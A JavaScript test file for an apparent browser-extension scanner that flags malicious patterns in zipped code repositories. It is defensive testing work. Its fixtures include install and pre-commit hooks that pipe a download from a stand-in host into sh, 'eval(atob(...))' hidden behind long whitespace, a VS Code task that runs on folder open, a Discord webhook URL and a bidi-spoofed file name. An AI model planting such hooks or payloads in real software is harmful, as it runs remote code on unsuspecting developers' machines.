import { test } from "node:test";
import assert from "node:assert/strict";
import { scanArchive, ARCHIVE_LIMITS } from "../extension/src/lib/archive-scan.js";
import { makeZip } from "./helpers/make-zip.js";

const R = "repo-3f9a1c2/"; // codeload wraps everything in <repo>-<ref>/
const z = (files) => makeZip(files.map((f) => ({ ...f, name: R + f.name })));
const ruleIds = (r) => r.findings.map((f) => f.rule);

test("clean project: nothing found, paths have no archive prefix, binaries and docs are not unpacked", async () => {
	const r = await scanArchive(
		z([
			{ name: "package.json", data: JSON.stringify({ scripts: { test: "node --test" }, dependencies: { express: "^4.19.0" } }) },
			{ name: "src/app.js", data: "import express from 'express';\nexpress().listen(3000);\n" },
			{ name: "README.md", data: "Install: curl -fsSL https://example.com/i.sh | sh" },
			{ name: "logo.png", data: "\u0089PNG\r\n" },
			{ name: "src/", data: "", method: 0 },
		]),
	);
	assert.equal(r.level, "none");
	assert.deepEqual(r.findings, []);
	assert.equal(r.read, 2);
	assert.equal(r.candidates, 2);
	assert.equal(r.totalEntries, 4);
});

test("attack patterns are found and reported with clean repo-relative paths", async () => {
	const r = await scanArchive(
		z([
			{ name: "package.json", data: JSON.stringify({ scripts: { postinstall: "curl -s https://x.example/a.sh | sh" } }) },
			{ name: "routes/auth.js", data: "const a = 1;\n" + " ".repeat(5000) + "eval(atob(payload));" },
			{ name: ".vscode/tasks.json", data: '{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}' },
			{ name: ".husky/pre-commit", data: "curl -s https://x.example/a | sh" },
		]),
	);
	assert.equal(r.level, "danger");
	const paths = new Set(r.findings.map((f) => f.path));
	assert.deepEqual([...paths].sort(), [".husky/pre-commit", ".vscode/tasks.json", "package.json", "routes/auth.js"]);
	assert.ok(ruleIds(r).includes("install_hook") && ruleIds(r).includes("decode_exec") && ruleIds(r).includes("vscode_autorun") && ruleIds(r).includes("remote_exec"));
	assert.ok(r.findings.every((f) => !f.path.startsWith("repo-")));
});

test("every file is read: no cap on how many files an archive has", async () => {
	const many = Array.from({ length: 1500 }, (_, i) => ({ name: `src/f${i}.js`, data: `export const v${i} = ${i};\n` }));
	many.push({ name: "src/zz-last.js", data: "eval(atob(x));" });
	const r = await scanArchive(z(many));
	assert.equal(r.read, 1501);
	assert.equal(r.unread, 0);
	assert.ok(ruleIds(r).includes("decode_exec"), "the very last file must still be scanned");
});

test("a file over the size limit is reported by name, not hidden and not unpacked", async () => {
	const r = await scanArchive(
		z([
			{ name: "src/ok.js", data: "const a = 1;" },
			{ name: "dist/huge.js", data: "x".repeat(5000) },
		]),
		{ limits: { ...ARCHIVE_LIMITS, entryBytes: 1000 } },
	);
	assert.equal(r.read, 1);
	assert.equal(r.tooLargeCount, 1);
	assert.deepEqual(r.tooLarge, ["dist/huge.js"]);
});

test("one corrupt entry is counted as unreadable and the rest is still scanned", async () => {
	const r = await scanArchive(
		z([
			{ name: "bomb.js", data: "A".repeat(100000), declaredSize: 8 },
			{ name: "server.js", data: "eval(atob(x));" },
		]),
	);
	assert.equal(r.unreadable, 1);
	assert.equal(r.read, 1);
	assert.ok(ruleIds(r).includes("decode_exec"));
});

test("binary data under a code-like name is not treated as text", async () => {
	const r = await scanArchive(z([{ name: "blob.js", data: Buffer.from([0x4d, 0x5a, 0x00, 0x01, 0x02]) }]));
	assert.equal(r.read, 0);
	assert.equal(r.unreadable, 1);
});

test("a total unpacked-bytes budget stops the scan and says so", async () => {
	const files = Array.from({ length: 10 }, (_, i) => ({ name: `s${i}.js`, data: "const a = 1;\n".repeat(200) }));
	const r = await scanArchive(z(files), { limits: { ...ARCHIVE_LIMITS, totalBytes: 3000 } });
	assert.equal(r.stopped, true);
	assert.ok(r.read < 10 && r.unread > 0, `read ${r.read}, unread ${r.unread}`);
});

test("entry names with control or bidi characters are made safe to show", async () => {
	const r = await scanArchive(z([{ name: "evil\u202egnp.js", data: "eval(atob(x));" }]));
	assert.ok(r.findings.every((f) => !/[\u202e\u0000-\u001f]/.test(f.path)));
	assert.ok(r.findings[0].path.includes("?"));
});

test("progress is reported and ends at done === total", async () => {
	const seen = [];
	await scanArchive(z(Array.from({ length: 45 }, (_, i) => ({ name: `a${i}.js`, data: "const a = 1;" }))), { onProgress: (p) => seen.push(p) });
	assert.equal(seen[0].done, 0);
	assert.deepEqual(seen.at(-1), { done: 45, total: 45 });
});

test("only the kept number of findings is returned, with the real count alongside", async () => {
	const files = Array.from({ length: 30 }, (_, i) => ({ name: `d${i}/a.js`, data: "eval(atob(x));\nconst h = 'https://discord.com/api/webhooks/1/a';" }));
	const r = await scanArchive(z(files), { limits: { ...ARCHIVE_LIMITS, keepFindings: 10 } });
	assert.equal(r.findings.length, 10);
	assert.equal(r.findingsTotal, 60);
});
